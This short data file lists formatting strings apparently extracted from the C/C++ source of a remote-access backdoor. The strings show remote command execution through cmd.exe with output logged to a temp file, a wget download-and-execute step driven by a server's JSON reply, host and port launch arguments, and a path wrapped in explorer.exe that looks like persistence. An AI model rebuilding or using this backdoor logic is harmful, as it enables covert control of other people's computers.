"printf(""> "");"
"printf(""Connected!\n"");"
"printf(""Connection error!\n"");"
"printf(""Error executing query!\n"");"
"printf(""Please enter your listening port: "");"
"printf(""Query executed successfuly!\n"");"
"sprintf(c_cmd_dir, ""%s\\cmd.exe"", str_windows);"
"sprintf(c_new_path, ""%s%s"", str_temp, s_file_name.c_str());"
"sprintf(c_new_path, ""%s\\%s"", str_windows, s_file_name.c_str());"
"sprintf(c_output, ""%s has downloaded and saved at: %s\\%s\nNow executing..."","
"sprintf(c_output, ""/C %s > %s"", c_new_data, c_temp_cmd);"
"sprintf(c_output, ""/C wget %s -O %s"", j_response[""URL""].get<string>().c_str(), j_response[""FILE""].get<string>().c_str());"
"sprintf(c_temp_cmd, ""%s%s"", str_temp, TMPLOG);"
"sprintf(full_path, ""\""%s\"" %s %s"", c_path, str_host, str_port);"
"sprintf(full_path, ""explorer.exe,\""%s %s %s\"""", c_path, str_host, str_port);"
"sprintf(paramFormat, ""%s %s"", str_host, str_port);"
